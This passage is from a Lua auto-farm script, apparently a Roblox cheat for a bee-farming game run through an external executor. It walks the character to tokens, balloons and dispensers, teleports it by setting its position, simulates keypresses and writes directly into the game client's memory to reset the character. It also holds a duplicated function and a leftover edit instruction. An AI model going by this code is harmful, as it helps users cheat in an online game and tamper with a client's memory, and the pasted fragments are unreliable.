            while IsWalking() and self.autoFarmEnabled and self.killCommandoChick do
                -- Safety check during walk
                hrp = character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local currentPos = hrp.Position
                    local nearbyCheck = self:GetNearbyMonsters(currentPos, 100)
                    
                    for _, monsterData in ipairs(nearbyCheck) do
                        if monsterData.distance < safeDistance then

                            StopWalking()
                            break
                        end
                    end
                    
                    local dx = currentPos.X - closestToken.X
                    local dz = currentPos.Z - closestToken.Z
                    local distSquared = dx * dx + dz * dz
                    
                    if distSquared < 25 then
                        StopWalking()
                        break
                    end
                end
                
                if os.clock() - startTime > 3 then
                    StopWalking()
                    break
                end
                
                wait(0.05)
            end
            
            StopWalking()
            
            table.insert(recentTokens, closestToken)
            if #recentTokens > 10 then
                table.remove(recentTokens, 1)
            end
        else
            if #recentTokens > 0 then
                recentTokens = {}
            end
            wait(0.2)
        end
        
        wait(0.05)
    end
    
    return tokensCollected > 0
end

function UI:FindBalloonInField()
    if not self.farmUnderBalloons or not self.autoFarmEnabled then
        return nil
    end
    
    local player = game.Players.LocalPlayer
    local character = player.Character
    if not character then return nil end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end
    
    local flowerZones = game.Workspace.FlowerZones
    if not flowerZones or not self.selectedOption then return nil end
    
    local targetZone = flowerZones:FindFirstChild(self.selectedOption)
    if not targetZone then return nil end
    
    local fieldPos = targetZone.Position
    local fieldSize = targetZone.Size
    
    local balloons = game.Workspace:FindFirstChild("Balloons")
    if not balloons then return nil end
    
    local fieldBalloons = balloons:FindFirstChild("FieldBalloons")
    if not fieldBalloons then return nil end
    
    -- Find balloon in current field
    for _, balloon in pairs(fieldBalloons:GetChildren()) do
        local balloonBody = balloon:FindFirstChild("BalloonBody")
        if balloonBody and balloonBody:IsA("BasePart") then
            local balloonPos = balloonBody.Position
            
            local dx = math.abs(balloonPos.X - fieldPos.X)
            local dz = math.abs(balloonPos.Z - fieldPos.Z)
            local dy = math.abs(balloonPos.Y - fieldPos.Y)
            
            local withinX = dx <= fieldSize.X / 2
            local withinZ = dz <= fieldSize.Z / 2
            local withinY = dy <= 100
            
            if withinX and withinZ and withinY then

                return balloonBody
            end
        end
    end
    
    return nil
end

function UI:FarmUnderBalloon(balloonBody)
    if not balloonBody or not balloonBody.Parent then

        return false
    end
    
    local player = game.Players.LocalPlayer
    local character = player.Character
    if not character then return false end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    
    -- Position under balloon (stay at ground level)
    local balloonPos = balloonBody.Position
    local targetPos = Vector3.new(balloonPos.X, balloonPos.Y, balloonPos.Z)
    
    -- Get the field's Y level
    local flowerZones = game.Workspace.FlowerZones
    if flowerZones and self.selectedOption then
        local targetZone = flowerZones:FindFirstChild(self.selectedOption)
        if targetZone then
            targetPos = Vector3.new(balloonPos.X, targetZone.Position.Y + 10, balloonPos.Z)
        end
    end
    

    self.status = "Farming Under Balloon"
    self.needsRedraw = true
    
    WalkTo(targetPos)
    
    local startTime = os.clock()
    while IsWalking() and self.autoFarmEnabled do
        if os.clock() - startTime > 10 then

            StopWalking()
            break
        end
        
        hrp = character:FindFirstChild("HumanoidRootPart")
        if hrp then
            local currentPos = hrp.Position
            local dx = currentPos.X - targetPos.X
            local dz = currentPos.Z - targetPos.Z
            local distSquared = dx * dx + dz * dz
            
            if distSquared < 25 then

                StopWalking()
                break
            end
        end
        
        wait(0.1)
    end
    
    StopWalking()
    

    -- Just return, let TokenCollector handle the rest
    return true
end

function UI:FindCloudInField()
    if not self.farmUnderClouds or not self.autoFarmEnabled then
        return nil
    end
    
    local player = game.Players.LocalPlayer
    local character = player.Character
    if not character then return nil end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end
    
    local flowerZones = game.Workspace.FlowerZones
    if not flowerZones or not self.selectedOption then return nil end
    
    local targetZone = flowerZones:FindFirstChild(self.selectedOption)
    if not targetZone then return nil end
    
    local fieldPos = targetZone.Position
    local fieldSize = targetZone.Size
    
    local clouds = game.Workspace:FindFirstChild("Clouds")
    if not clouds then return nil end
    
    -- Find cloud in current field
    for _, cloudInstance in pairs(clouds:GetChildren()) do
        if cloudInstance.Name == "CloudInstance" then
            local plane = cloudInstance:FindFirstChild("Plane")
            if plane and plane:IsA("BasePart") then
                local cloudPos = plane.Position
                
                local dx = math.abs(cloudPos.X - fieldPos.X)
                local dz = math.abs(cloudPos.Z - fieldPos.Z)
                local dy = math.abs(cloudPos.Y - fieldPos.Y)
                
                local withinX = dx <= fieldSize.X / 2
                local withinZ = dz <= fieldSize.Z / 2
                local withinY = dy <= 100
                
                if withinX and withinZ and withinY then

                    return plane
                end
            end
        end
    end
    
    return nil
end

function UI:FarmUnderCloud(cloudPlane)
    if not cloudPlane or not cloudPlane.Parent then

        return false
    end
    
    local player = game.Players.LocalPlayer
    local character = player.Character
    if not character then return false end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    

    self.status = "Farming Under Cloud"
    self.needsRedraw = true
    
    -- Get the field's Y level once
    local fieldY = nil
    local flowerZones = game.Workspace.FlowerZones
    if flowerZones and self.selectedOption then
        local targetZone = flowerZones:FindFirstChild(self.selectedOption)
        if targetZone then
            fieldY = targetZone.Position.Y + 10
        end
    end
    
    if not fieldY then

        return false
    end
    
    -- Walk under cloud for 3 seconds, continuously updating position
    local walkStartTime = os.clock()
    
    while self.autoFarmEnabled and (os.clock() - walkStartTime) < 3 do
        -- Check if cloud still exists
        if not cloudPlane or not cloudPlane.Parent then

            StopWalking()
            break
        end
        
        -- Get fresh cloud position
        local cloudPos = cloudPlane.Position
        local targetPos = Vector3.new(cloudPos.X, fieldY, cloudPos.Z)
        
        -- Update walk target to follow the cloud
        WalkTo(targetPos)
        
        wait(0.1) -- Update position every 0.1 seconds
    end
    
    StopWalking()
    
    -- Update last cloud time
    self.lastCloudTime = os.clock()
    

    return true
end

function UI:CheckForFlamesInField()
    if not self.farmFlames or not self.autoFarmEnabled then
        return nil
    end
    
    -- Check cooldown timer
    local currentTime = os.clock()
    if self.lastFlameTime and (currentTime - self.lastFlameTime) < 6 then
        -- Still on cooldown
        return nil
    end
    
    local player = game.Players.LocalPlayer
    local character = player.Character
    if not character then return nil end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end
    
    local flowerZones = game.Workspace.FlowerZones
    if not flowerZones or not self.selectedOption then return nil end
    
    local targetZone = flowerZones:FindFirstChild(self.selectedOption)
    if not targetZone then return nil end
    
    local fieldPos = targetZone.Position
    local fieldSize = targetZone.Size
    
    local playerFlames = game.Workspace:FindFirstChild("PlayerFlames")
    if not playerFlames then 
        return nil 
    end
    
    local flamesInField = {}
    
    -- Find all flames in current field
    for _, flame in pairs(playerFlames:GetChildren()) do
        if flame.Name:match("^Flm%d+") and flame:IsA("BasePart") then
            local flamePos = flame.Position
            
            local dx = math.abs(flamePos.X - fieldPos.X)
            local dz = math.abs(flamePos.Z - fieldPos.Z)
            local dy = math.abs(flamePos.Y - fieldPos.Y)
            
            local withinX = dx <= fieldSize.X / 2
            local withinZ = dz <= fieldSize.Z / 2
            local withinY = dy <= 50
            
            if withinX and withinZ and withinY then
                table.insert(flamesInField, flame)
            end
        end
    end
    
    if #flamesInField > 0 then

        return flamesInField
    end
    
    return nil
end

function UI:CheckForFlamesInField()
    if not self.farmFlames or not self.autoFarmEnabled then
        return nil
    end
    
    local player = game.Players.LocalPlayer
    local character = player.Character
    if not character then return nil end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end
    
    local flowerZones = game.Workspace.FlowerZones
    if not flowerZones or not self.selectedOption then return nil end
    
    local targetZone = flowerZones:FindFirstChild(self.selectedOption)
    if not targetZone then return nil end
    
    local fieldPos = targetZone.Position
    local fieldSize = targetZone.Size
    
    local playerFlames = game.Workspace:FindFirstChild("PlayerFlames")
    if not playerFlames then 
        return nil 
    end
    
    local flamesInField = {}
    
    -- Find all flames in current field
    for _, flame in pairs(playerFlames:GetChildren()) do
        if flame.Name:match("^Flm%d+") and flame:IsA("BasePart") then
            local flamePos = flame.Position
            
            local dx = math.abs(flamePos.X - fieldPos.X)
            local dz = math.abs(flamePos.Z - fieldPos.Z)
            local dy = math.abs(flamePos.Y - fieldPos.Y)
            
            local withinX = dx <= fieldSize.X / 2
            local withinZ = dz <= fieldSize.Z / 2
            local withinY = dy <= 50
            
            if withinX and withinZ and withinY then
                table.insert(flamesInField, flame)
            end
        end
    end
    
    if #flamesInField > 0 then

        return flamesInField
    end
    
    return nil
end

function UI:CheckForBubblesInField()
    if not self.farmBubbles or not self.autoFarmEnabled then
        return nil
    end
    
    local player = game.Players.LocalPlayer
    local character = player.Character
    if not character then return nil end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end
    
    local particles = game.Workspace:FindFirstChild("Particles")
    if not particles then return nil end
    
    local bubblesInField = {}
    local playerPos = hrp.Position
    
    -- ULTRA STRICT: Only check bubbles within 30 studs of player
    for _, child in pairs(particles:GetChildren()) do
        if child:IsA("BasePart") and child.Name == "Bubble" then
            local bubblePos = child.Position
            
            local dx = bubblePos.X - playerPos.X
            local dz = bubblePos.Z - playerPos.Z
            local distToPlayer = math.sqrt(dx * dx + dz * dz)
            
            -- Only farm bubbles within 30 studs
            if distToPlayer <= 30 then
                table.insert(bubblesInField, child)

            end
        end
    end
    
    if #bubblesInField == 0 then
        return nil
    end
    

    return bubblesInField
end

function UI:FarmBubbles(bubbles)
    if not bubbles or #bubbles == 0 then
        return false
    end
    

    self.status = "Farming Bubbles"
    self.needsRedraw = true
    
    local player = game.Players.LocalPlayer
    local character = player.Character
    if not character then return false end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    
    -- Walk to each bubble quickly - no waiting
    for i, bubble in ipairs(bubbles) do
        -- Safety check: make sure bubble exists and has Position
        if not bubble or not bubble.Parent or not bubble.Position then

            continue
        end
        
        if not self.autoFarmEnabled or not self.farmBubbles then
            wait(0.1)
            return false
        end
        
        local bubblePos = bubble.Position
        
        WalkTo(bubblePos)
        
        local startTime = os.clock()
        while IsWalking() and self.autoFarmEnabled and self.farmBubbles do
            if os.clock() - startTime > 1 then
                StopWalking()
                break
            end
            
            hrp = character:FindFirstChild("HumanoidRootPart")
            if hrp then
                local currentPos = hrp.Position
                local dx = currentPos.X - bubblePos.X
                local dz = currentPos.Z - bubblePos.Z
                local distSquared = dx * dx + dz * dz
                
                if distSquared < 25 then
                    StopWalking()
                    break
                end
            end
            
            wait(0.05)
        end
        
        StopWalking()
    end
end

function UI:StartStatusUpdater()
    if self.statusUpdaterThread then
        task.cancel(self.statusUpdaterThread)
        self.statusUpdaterThread = nil
    end
    
    self.statusUpdaterThread = task.spawn(function()
        
        while self.isRunning do
            if self.autoFarmEnabled then
                local success = pcall(function()
                    local player = game.Players.LocalPlayer
                    local character = player.Character
                    
                    if character then
                        local coreStats = player:FindFirstChild("CoreStats")
                        if coreStats then
                            local pollen = coreStats:FindFirstChild("Pollen")
                            local capacity = coreStats:FindFirstChild("Capacity")
                            
                            if pollen and capacity then
                                local pollenValue = math.floor(pollen.Value)
                                local capacityValue = math.floor(capacity.Value)
                                local percentage = math.floor((pollenValue / capacityValue) * 100)
                                
                                local newStatus = string.format("Farming | %d%% (%d/%d)", percentage, pollenValue, capacityValue)
                                
                                if self.status ~= newStatus then
                                    self.status = newStatus
                                    self.needsRedraw = true
                                end
                            end
                        end
                    end
                end)
                
                if not success then
                    warn("Status updater error (non-fatal)")
                end
            end
            
            task.wait(1)
        end
        
        self.statusUpdaterThread = nil
    end)
end

function UI:WalkToHive()
    self.status = "Finding Hive"
    self.needsRedraw = true
    
    spawn(function()
        local player = game.Players.LocalPlayer
        local character = player.Character
        
        if not character then
            self.status = "Error: No character"
            self.needsRedraw = true
            return
        end
        
        local honeycombs = game.Workspace:FindFirstChild("Honeycombs")
        if not honeycombs then

            self.status = "No Honeycombs!"
            self.needsRedraw = true
            return
        end
        
        local maxAttempts = 6
        local attemptCount = 0
        local claimed = false
        
        while not claimed and attemptCount < maxAttempts do
            attemptCount = attemptCount + 1
            
            local hives = honeycombs:GetChildren()
            local availableHive = nil
            
            for _, hive in pairs(hives) do
                local owner = hive:FindFirstChild("Owner")
                if owner then
                    local ownerValue = tostring(owner.Value)
                    if owner.Value == player then
                        self.status = "Hive Owned"
                        self.needsRedraw = true
                        return
                    elseif ownerValue:find("Unreadable_name") then
                        availableHive = hive
                        break
                    end
                end
            end
            
            if not availableHive then
                self.status = "No hives available"
                self.needsRedraw = true
                return
            end
            self.status = "Claiming " .. availableHive.Name
            self.needsRedraw = true
            local hivePart = availableHive:FindFirstChild("Display") or availableHive:FindFirstChildWhichIsA("BasePart")
            if not hivePart then
                wait(1)
            else
                -- In the WalkToHive function, change this line:
local hivePos = Vector3.new(hivePart.Position.X, hivePart.Position.Y, hivePart.Position.Z - 15)


local hivePos = Vector3.new(hivePart.Position.X, 4, hivePart.Position.Z - 15)
                
                local success = WalkTo(hivePos)
                if not success then

                    wait(1)
                else
                    self.status = "Walking to " .. availableHive.Name
                    self.needsRedraw = true
                    
                    local arrived = WaitForArrival(30)
                    
                    StopWalking()
                    wait(0.5)
                    
                    if arrived then
                        self.status = "Claiming hive..."
                        self.needsRedraw = true
                        
                        wait(0.5)
                        
                        keypress(0x45)
                        wait(0.2)
                        keyrelease(0x45)
                        
                        wait(3)
                        
                        local owner = availableHive:FindFirstChild("Owner")
if owner then
    local ownerStr = tostring(owner.Value)
    if not ownerStr:find("Unreadable_name") then
        self.status = "Hive Claimed!"
        self.needsRedraw = true
        claimed = true
    else
        self.status = "Claim failed, retrying..."
        self.needsRedraw = true
    end
end
                    else

                    end
                    
                    wait(1)
                end
            end
        end
        
        if not claimed then
            self.status = "Claim failed"
            self.needsRedraw = true
        end
    end)
end

function UI:StartCoconutCrab()
    if self.coconutCrabRunning then

        return
    end
    
    self.coconutCrabRunning = true
    self.status = "Coconut Crab Active"
    self.needsRedraw = true
    
    spawn(function()
        local targetPosition = Vector3.new(-312, 115, 511)
        local initialCrabCount = 0
        
        local monsters = game.Workspace:FindFirstChild("Monsters")
        if monsters then
            for _, mob in pairs(monsters:GetChildren()) do
                if mob.Name == "Coconut Crab (Lvl 12)" then
                    initialCrabCount = initialCrabCount + 1
                end
            end
        end
        

        
        while self.killCoconutCrab and self.coconutCrabRunning do
            local player = game.Players.LocalPlayer
            local character = player.Character
            
            if not character then
                wait(1)
                continue
            end
            
            local hrp = character:FindFirstChild("HumanoidRootPart")
            if not hrp then
                wait(1)
                continue
            end
            
            local currentPos = hrp.Position
            local dx = currentPos.X - targetPosition.X
            local dy = currentPos.Y - targetPosition.Y
            local dz = currentPos.Z - targetPosition.Z
            local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
            
            if distance > 15 then
                self.status = "Going to Coconut Crab"
                self.needsRedraw = true
                self:QueueTween(hrp, targetPosition, true)
                while self.processingTween and self.killCoconutCrab do
                    wait(0.1)
                end
            end
            
            local currentCrabCount = 0
            monsters = game.Workspace:FindFirstChild("Monsters")
            if monsters then
                for _, mob in pairs(monsters:GetChildren()) do
                    if mob.Name == "Coconut Crab (Lvl 12)" then
                        currentCrabCount = currentCrabCount + 1
                    end
                end
            end
            

            
            if currentCrabCount > initialCrabCount then
                self.status = "Fighting Coconut Crab (" .. currentCrabCount .. ")"
                self.needsRedraw = true
                

                
                local lastCrabCheck = os.clock()
                local loopCount = 0
                
                while self.killCoconutCrab and currentCrabCount > initialCrabCount do
                    hrp = character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        hrp.Position = targetPosition
                        hrp.Velocity = Vector3.new(0, 0, 0)
                    end
                    
                    loopCount = loopCount + 1
                    
                    if os.clock() - lastCrabCheck >= 0.5 then
                        currentCrabCount = 0
                        monsters = game.Workspace:FindFirstChild("Monsters")
                        if monsters then
                            for _, mob in pairs(monsters:GetChildren()) do
                                if mob.Name == "Coconut Crab (Lvl 12)" then
                                    currentCrabCount = currentCrabCount + 1
                                end
                            end
                        end
                        lastCrabCheck = os.clock()

                    end
                    
                    wait(0.03)
                end
                

                
                initialCrabCount = currentCrabCount
            else

            end
            
            self.status = "Going to Coconut Field"
            self.needsRedraw = true
            
            local flowerZones = game.Workspace.FlowerZones
            if flowerZones then
                local coconutField = flowerZones:FindFirstChild("Coconut Field")
                if coconutField then
                    hrp = character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        local fieldPos = Vector3.new(coconutField.Position.X, coconutField.Position.Y + 10, coconutField.Position.Z)
                        self:QueueTween(hrp, fieldPos, true)
                        
                        while self.processingTween and self.killCoconutCrab do
                            wait(0.1)
                        end
                        
                        self.status = "Farming Coconut Field (30s)"
                        self.needsRedraw = true
                        

                        
                        local farmStartTime = os.clock()
                        local recentTokens = {}
                        
                        while self.killCoconutCrab and (os.clock() - farmStartTime) < 30 do
                            local collectibles = game.Workspace:FindFirstChild("Collectibles")
                            if collectibles then
                                character = player.Character
                                if character then
                                    hrp = character:FindFirstChild("HumanoidRootPart")
                                    if hrp then
                                        local hrpPos = hrp.Position
                                        local closestToken = nil
                                        local closestDistance = math.huge
                                        
                                        for _, token in pairs(collectibles:GetChildren()) do
                                            if token.Name == "C" and token:IsA("BasePart") and token.Parent then
                                                local tokenPos = token.Position
                                                if tokenPos then
                                                    local isRecent = false
                                                    for _, recentPos in ipairs(recentTokens) do
                                                        local tdx = math.abs(tokenPos.X - recentPos.X)
                                                        local tdy = math.abs(tokenPos.Y - recentPos.Y)
                                                        local tdz = math.abs(tokenPos.Z - recentPos.Z)
                                                        if tdx < 3 and tdy < 3 and tdz < 3 then
                                                            isRecent = true
                                                            break
                                                        end
                                                    end
                                                    
                                                    if not isRecent then
                                                        local tdy = math.abs(hrpPos.Y - tokenPos.Y)
                                                        if tdy <= 10 then
                                                            local tdx = hrpPos.X - tokenPos.X
                                                            local tdz = hrpPos.Z - tokenPos.Z
                                                            local distSquared = tdx * tdx + tdz * tdz
                                                            
                                                            if distSquared < 2500 and distSquared < closestDistance then
                                                                closestDistance = distSquared
                                                                closestToken = tokenPos
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                        
                                        if closestToken then
                                            WalkTo(closestToken)
                                            
                                            local startTime = os.clock()
                                            while IsWalking() and self.killCoconutCrab do
                                                if os.clock() - startTime > 3 then
                                                    StopWalking()
                                                    break
                                                end
                                                
                                                hrp = character:FindFirstChild("HumanoidRootPart")
                                                if hrp then
                                                    local currentPos = hrp.Position
                                                    local cdx = currentPos.X - closestToken.X
                                                    local cdz = currentPos.Z - closestToken.Z
                                                    local distSquared = cdx * cdx + cdz * cdz
                                                    
                                                    if distSquared < 25 then
                                                        StopWalking()
                                                        break
                                                    end
                                                end
                                                
                                                wait(0.05)
                                            end
                                            
                                            StopWalking()
                                            
                                            table.insert(recentTokens, closestToken)
                                            if #recentTokens > 10 then
                                                table.remove(recentTokens, 1)
                                            end
                                        else
                                            if #recentTokens > 0 then
                                                recentTokens = {}
                                            end
                                        end
                                    end
                                end
                            end
                            
                            wait(0.05)
                        end
                        

                        StopWalking()
                    end
                end
            end
            
            wait(0.5)
        end
        
        self.coconutCrabRunning = false
        self.status = "Stopped"
        self.needsRedraw = true
    end)
end

function UI:StopCoconutCrab()
    self.coconutCrabRunning = false
    self.killCoconutCrab = false
    self:ClearTweenQueue()
    StopWalking()
    self.status = "Stopped"
    self.needsRedraw = true
end

function UI:StartTrainSnail()
    if self.trainSnailRunning then

        return
    end
    self.trainSnailRunning = true
    self.status = "Train Snail Active"
    self.needsRedraw = true
    spawn(function()
        while self.trainSnail and self.trainSnailRunning do
            local success, err = pcall(function()
                local player = game.Players.LocalPlayer
                local character = player.Character
                
                if not character then
                    wait(1)
                    return
                end
                
                local hrp = character:FindFirstChild("HumanoidRootPart")
                if not hrp then
                    wait(1)
                    return
                end
                
                local flowerZones = game.Workspace.FlowerZones
                if not flowerZones then
                    wait(1)
                    return
                end
                
                local stumpField = flowerZones:FindFirstChild("Stump Field")
                if not stumpField then

                    wait(5)
                    return
                end
                
                local hrpPos = hrp.Position
                local fieldPos = stumpField.Position
                local fieldSize = stumpField.Size
                local withinX = math.abs(hrpPos.X - fieldPos.X) <= fieldSize.X / 2
                local withinZ = math.abs(hrpPos.Z - fieldPos.Z) <= fieldSize.Z / 2
                local withinY = math.abs(hrpPos.Y - fieldPos.Y) <= 50
                local inField = withinX and withinZ and withinY
                
                if inField then
                    local innerZoneX = fieldSize.X / 4 
                    local innerZoneZ = fieldSize.Z / 4
                    local withinInnerX = math.abs(hrpPos.X - fieldPos.X) <= innerZoneX
                    local withinInnerZ = math.abs(hrpPos.Z - fieldPos.Z) <= innerZoneZ
                    local inInnerZone = withinInnerX and withinInnerZ
                    
                    if not inInnerZone then
                        self.status = "Returning to Safe Zone"
                        self.needsRedraw = true
                        
                        StopWalking()
                        
                        local centerPos = Vector3.new(fieldPos.X, fieldPos.Y + 10, fieldPos.Z)
                        self:QueueTween(hrp, centerPos, true)
                        
                        while self.processingTween and self.trainSnail do
                            wait(0.1)
                        end
                        wait(0.5)
                    end
                    self.status = "Training at Stump Field"
                    self.needsRedraw = true
                    local collectibles = game.Workspace:FindFirstChild("Collectibles")
                    if collectibles then
                        hrp = character:FindFirstChild("HumanoidRootPart")
                        if hrp then
                            local hrpPos = hrp.Position
                            local closestToken = nil
                            local closestDistance = math.huge
                            
                            for _, token in pairs(collectibles:GetChildren()) do
                                if token.Name == "C" and token:IsA("BasePart") and token.Parent then
                                    local tokenPos = token.Position
                                    if tokenPos and type(tokenPos) == "userdata" then
                                        local posX, posY, posZ = GetPosition(token)
                                        if posX and posY and posZ then
                                            local tokenInnerX = math.abs(posX - fieldPos.X) <= innerZoneX
                                            local tokenInnerZ = math.abs(posZ - fieldPos.Z) <= innerZoneZ
                                            
                                            if tokenInnerX and tokenInnerZ then
                                                local dy = math.abs(hrpPos.Y - posY)
                                                if dy <= 10 then
                                                    local dx = hrpPos.X - posX
                                                    local dz = hrpPos.Z - posZ
                                                    local distSquared = dx * dx + dz * dz
                                                    
                                                    if distSquared < 2500 and distSquared < closestDistance then
                                                        closestDistance = distSquared
                                                        closestToken = Vector3.new(posX, posY, posZ)
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                            
                            if closestToken then
                                WalkTo(closestToken)
                                wait(0.5)
                                StopWalking()
                            else
                                wait(0.2)
                            end
                        end
                    else
                        wait(0.2)
                    end
                else
                    self.status = "Going to Stump Field"
                    self.needsRedraw = true
                    local centerPos = Vector3.new(fieldPos.X, fieldPos.Y + 10, fieldPos.Z)
                    self:QueueTween(hrp, centerPos, true)
                    
                    while self.processingTween and self.trainSnail do
                        wait(0.1)
                    end
                end
            end)
            
            if not success then

                wait(2)
            end
            
            wait(0.05)
        end
        
        self.trainSnailRunning = false
        self.status = "Stopped"
    end)
end

function UI:StopTrainSnail()
    self.trainSnailRunning = false
    self.trainSnail = false
    self:ClearTweenQueue()
    StopWalking()
    self.status = "Stopped"
    self.needsRedraw = true
end

function UI:StartFarmPuppyBall()
    if self.farmPuppyBallRunning then

        return
    end
    
    self.farmPuppyBallRunning = true
    
    spawn(function()
        while self.farmPuppyBall and self.farmPuppyBallRunning do
            local success, err = pcall(function()
                local player = game.Players.LocalPlayer
                local character = player.Character
                
                if not character then
                    wait(1)
                    return
                end
                
                local hrp = character:FindFirstChild("HumanoidRootPart")
                if not hrp then
                    wait(1)
                    return
                end
                
                local tennisBall = game.Workspace:FindFirstChild("TennisBall")
                if not tennisBall then
                    wait(1)
                    return
                end
                
                local ballPos = tennisBall.Position
                WalkTo(ballPos)
                
                local lastUpdateTime = os.clock()
                local walkStartTime = os.clock()
                
                while IsWalking() and self.farmPuppyBall do
                    if os.clock() - lastUpdateTime >= 0.01 then
                        tennisBall = game.Workspace:FindFirstChild("TennisBall")
                        if tennisBall then
                            ballPos = tennisBall.Position
                            WalkTo(ballPos)

                        else

                            StopWalking()
                            break
                        end
                        lastUpdateTime = os.clock()
                    end
                    
                    -- Timeout check
                    if os.clock() - walkStartTime > 10 then

                        StopWalking()
                        break
                    end
                    
                    -- Distance check - stop if close enough
                    hrp = character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        local currentPos = hrp.Position
                        local dx = currentPos.X - ballPos.X
                        local dz = currentPos.Z - ballPos.Z
                        local distSquared = dx * dx + dz * dz
                        
                        if distSquared < 25 then

                            StopWalking()
                            break
                        end
                    end
                    
                    wait(0.05)
                end
                StopWalking()
                wait(3)
            end)
            
            if not success then

                wait(2)
            end
            
            wait(0.1)
        end
        
        self.farmPuppyBallRunning = false
    end)
end

function UI:StopFarmPuppyBall()
    self.farmPuppyBallRunning = false
    self.farmPuppyBall = false
    StopWalking()
end

-- ============================================================
-- DISPENSER CONFIGURATION
-- ============================================================

UI.dispenserConfig = {
    coconutDispenser = {
        name = "Coconut Dispenser",
        interval = 14400,  -- 4 hours
        position = Vector3.new(-177, 73, 533),
        key = 0x45,  -- E key
        waitAfterPress = 1,
        enabled = function(self) return self.collectCoconutDispenser end
    },
    antPass = {
        name = "Ant Pass",
        interval = 10800,  -- 3 hours
        position = Vector3.new(125, 32, 495),
        key = 0x45,
        waitAfterPress = 1,
        enabled = function(self) return self.collectAntPass end
    },
    honeyStorm = {
        name = "Honey Storm",
        interval = 14400,  -- 4 hours
        position = Vector3.new(233, 34, 163),
        key = 0x45,
        waitAfterPress = 1,
        enabled = function(self) return self.summonHoneyStorm end
    },
    glue = {
        name = "Glue",
        interval = 3600,  -- 1 hour
        position = Vector3.new(15, 92, 489),
        key = 0x32,  -- 2 key
        waitAfterPress = 2,
        specialHandling = "glue",
        enabled = function(self) return self.collectGlue end
    },
    honeyDispenser = {
        name = "Honey Dispenser",
        interval = 3600,  -- 1 hour
        position = Vector3.new(46, 5, 321),
        key = 0x45,
        waitAfterPress = 1,
        enabled = function(self) return self.collectHoneyDispenser end
    },
    blueberryDispenser = {
        name = "Blueberry Dispenser",
        interval = 14400,  -- 4 hours
        position = Vector3.new(308, 4, 135),
        key = 0x45,
        waitAfterPress = 1,
        enabled = function(self) return self.collectBlueberryDispenser end
    },
    treatDispenser = {
        name = "Treat Dispenser",
        interval = 3600,  -- 1 hour
        position = Vector3.new(193, 68, -124),
        key = 0x45,
        waitAfterPress = 1,
        enabled = function(self) return self.collectTreatDispenser end
    },
    strawberryDispenser = {
        name = "Strawberry Dispenser",
        interval = 3600,  -- 1 hour
        position = Vector3.new(-321, 46, 270),
        key = 0x45,
        waitAfterPress = 1,
        enabled = function(self) return self.collectStrawberryDispenser end
    },
    royalJellyDispenser = {
        name = "Royal Jelly Dispenser",
        interval = 79200,  -- 22 hours
        position = Vector3.new(130, 65, 334),
        key = 0x45,
        waitAfterPress = 1,
        enabled = function(self) return self.collectRoyalJellyDispenser end
    },
    roboPassDispenser = {
        name = "Robo Pass Dispenser",
        interval = 79200,  -- 22 hours
        position = Vector3.new(-92, 183, -298),
        key = 0x45,
        waitAfterPress = 1,
        enabled = function(self) return self.collectRoboPassDispenser end
    }
}

function UI:CollectDispenser(dispenserKey)
    local config = self.dispenserConfig[dispenserKey]
    if not config then

        return false
    end
    

    
    local player = game.Players.LocalPlayer
    local character = player.Character
    
    if not character then

        return false
    end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then

        return false
    end
    
    local previousStatus = self.status
    local wasCollectingTokens = self.collectTokens
    
    self.pausedForTimedAction = true
    self.collectTokens = false
    StopWalking()
    self:ClearTweenQueue()
    wait(0.5)
    
    self.status = "Going to " .. config.name
    self.needsRedraw = true
    

    self:QueueTween(hrp, config.position, true)
    
    local maxWaitTime = 60
    local startWait = os.clock()
    
    while self.processingTween and self.autoFarmEnabled do
        if os.clock() - startWait > maxWaitTime then

            self:ClearTweenQueue()
            break
        end
        wait(0.1)
    end
    

    wait(0.5)
    
    -- Wait for Roblox to be active
    while not isrbxactive() and self.autoFarmEnabled do
        warn("Roblox Is Not Active - waiting to collect " .. config.name)
        self.status = "Waiting for Roblox window"
        self.needsRedraw = true
        wait(0.5)
    end
    
    if self.autoFarmEnabled then
        self.status = "Collecting " .. config.name
        self.needsRedraw = true
        
        -- Special handling for glue (needs to place sprinkler first)
        if config.specialHandling == "glue" then

            keypress(config.key)
            wait(0.1)
            keyrelease(config.key)
            wait(config.waitAfterPress)
            
            -- Check player's Y level AFTER placing sprinkler
            hrp = character:FindFirstChild("HumanoidRootPart")
            if hrp then
                local playerY = hrp.Position.Y

                
                if playerY > 10000 then

                    self.status = "Going to Glue Collection Area"
                    self.needsRedraw = true
                    
                    local glueCollectionPos = Vector3.new(270, 25257, -722)
                    self:QueueTween(hrp, glueCollectionPos, true)
                    
                    local startWait = os.clock()
                    while self.processingTween and self.autoFarmEnabled do
                        if os.clock() - startWait > 60 then

                            self:ClearTweenQueue()
                            break
                        end
                        wait(0.1)
                    end
                    

                    wait(1)
                else

                end
            end
            
            -- LAST STEP: Kill player (works for both high and low level)

            self.status = "Resetting Player"
            self.needsRedraw = true
            
            character = player.Character
            if character then
                local humanoid = character:FindFirstChild("Humanoid")
                if humanoid and humanoid.Address then
                    local addr = humanoid.Address
                    local v = Vector3.new(0, 0, 0)
                    memory_write("float", addr + 0x18C + 8, v.Z)

                    
                    -- Wait for respawn
                    local respawned = WaitForRespawn(30)
                    
                    if respawned then

                        self.status = "Waiting for bees..."
                        self.needsRedraw = true
                        wait(15)  -- Wait for bees
                    else

                    end
                else

                end
            end
            
        else
            -- Normal dispenser collection

            keypress(config.key)
            wait(0.1)
            keyrelease(config.key)
            wait(config.waitAfterPress)
        end
        

    end
    
    -- Return to field
